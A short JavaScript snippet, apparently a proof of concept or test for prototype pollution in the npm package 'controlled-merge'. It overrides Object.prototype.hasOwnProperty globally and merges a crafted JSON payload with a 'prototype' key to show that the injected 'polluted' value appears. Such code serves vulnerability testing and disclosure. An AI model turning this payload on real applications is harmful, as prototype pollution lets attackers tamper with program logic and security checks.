Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const merge = require('controlled-merge');
const obj = merge({}, JSON.parse('{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'), true);
console.log('{ ' + obj.prototype.polluted + ', ' + 'yes' + ' }');